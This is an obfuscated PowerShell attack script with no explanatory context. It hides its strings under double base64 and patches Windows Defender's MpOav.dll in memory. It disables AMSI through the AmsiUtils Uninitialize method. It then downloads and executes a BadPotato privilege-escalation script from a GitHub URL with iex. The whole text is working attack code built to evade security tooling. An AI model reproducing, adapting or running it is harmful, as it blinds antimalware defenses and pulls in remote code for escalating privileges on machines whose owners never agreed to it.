function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $uuyv8t,
        [Parameter(Position = 1, Mandatory = $True)] [String] $oyAE6g6
    )

    # Get a reference to System.dll in the GAC
    $Tnla7D = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WEZ3PQ==')))))))[-1].Equals(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VTNsemRHVnRMbVJzYkE9PQ=='))))))) }
    $OXRxRVhh = $Tnla7D.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VFdsamNtOXpiMlowTGxkcGJqTXlMbFZ1YzJGbVpVNWhkR2wyWlUxbGRHaHZaSE09')))))))
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $i4DAt = $OXRxRVhh.GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UjJWMFRXOWtkV3hsU0dGdVpHeGw=')))))))
    $stmfHEB = $OXRxRVhh.GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UjJWMFVISnZZMEZrWkhKbGMzTT0=')))))), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $AAoq7 = $i4DAt.Invoke($null, @($uuyv8t))
    $mtH0Di = New-Object IntPtr
    $pTUcD = New-Object System.Runtime.InteropServices.HandleRef($mtH0Di, $AAoq7)
    # Return the address of the function
    return $stmfHEB.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$pTUcD, $oyAE6g6))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $kXi7bER = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $wCO80w = [Void]
    )

    $NF4WDXB = [AppDomain]::CurrentDomain
    $tgV1 = New-Object System.Reflection.AssemblyName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW1WbWJHVmpkR1ZrUkdWc1pXZGhkR1U9')))))))
    $lzz6 = $NF4WDXB.DefineDynamicAssembly($tgV1, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $GPvGdl = $lzz6.DefineDynamicModule(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1c1TlpXMXZjbmxOYjJSMWJHVT0=')))))), $false)
    $zhkGaD = $GPvGdl.DefineType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VFhsRVpXeGxaMkYwWlZSNWNHVT0=')))))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UTJ4aGMzTXNJRkIxWW14cFl5d2dVMlZoYkdWa0xDQkJibk5wUTJ4aGMzTXNJRUYxZEc5RGJHRnpjdz09')))))), [System.MulticastDelegate])
    $vVOjGC = $zhkGaD.DefineConstructor(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VWxSVGNHVmphV0ZzVG1GdFpTd2dTR2xrWlVKNVUybG5MQ0JRZFdKc2FXTT0=')))))), [System.Reflection.CallingConventions]::Standard, $kXi7bER)
    $vVOjGC.SetImplementationFlags(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5WdWRHbHRaU3dnVFdGdVlXZGxaQT09')))))))
    $uYR1O = $zhkGaD.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1c1MmIydGw=')))))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VUhWaWJHbGpMQ0JJYVdSbFFubFRhV2NzSUU1bGQxTnNiM1FzSUZacGNuUjFZV3c9')))))), $wCO80w, $kXi7bER)
    $uYR1O.SetImplementationFlags(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5WdWRHbHRaU3dnVFdGdVlXZGxaQT09')))))))
        
    Write-Output $zhkGaD.CreateType()
}
$lTwx81 = Get-ProcAddress kernel32.dll LoadLibraryA
$h9Mjv = Get-DelegateType @([String]) ([IntPtr])
$u7SY2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lTwx81,
$h9Mjv)
$oWeLQP = Get-ProcAddress kernel32.dll GetProcAddress
$CteXIf8T = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$stmfHEB = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($oWeLQP,
$CteXIf8T)
$HiqRuxFx = Get-ProcAddress kernel32.dll VirtualProtect
$qNWtmGi = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$pipq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HiqRuxFx,
$qNWtmGi)

$Pjyv = $u7SY2.Invoke(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VFhCUFlYWXVaR3hz')))))))
$dkuucI = $stmfHEB.Invoke($Pjyv,
([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ukd4c1IyVjBRMnhoYzNOUFltcGxZM1E9')))))))
$dYmuX = 0
$pipq.Invoke($dkuucI, [uint32]6, 0x40, [ref]$dYmuX) 
$avvPpEOj = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhoQ09BPT0='))))))
$KOia = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhnMU53PT0='))))))
$bKu3Aa = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhnd01BPT0='))))))
$KkdlXdjY = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhnd053PT0='))))))
$ZEnvvi = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhnNE1BPT0='))))))
$EH6tt = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TUhoRE13PT0='))))))
$ypXoyakc = [Byte[]] ($avvPpEOj,$KOia,$bKu3Aa,$KkdlXdjY,+$ZEnvvi,+$EH6tt)
[System.Runtime.InteropServices.Marshal]::Copy($ypXoyakc, 0, $dkuucI, 6)
$WiyYz = [Ref].Assembly.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VTNsemRHVnRMazFo'))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ym1Gbg=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WlcxbA=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ym5RdVFYVjBiMjA9'))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WVhScGIyNHVRUT09'))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YlhNPQ=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YVZVPQ=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZEdrPQ=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YkhNPQ==')))))))
$mCUcZqG = $WiyYz.GetMethods(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGc9PQ=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YjI1UWRRPT0='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW14cFl5eHpkQT09'))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WVhRPQ=='))))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YVdNPQ=='))))))) | Where-Object Name -eq Uninitialize
$mCUcZqG.Invoke($WiyYz,$null)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-BadPotato.ps1')
Invoke-BadPotato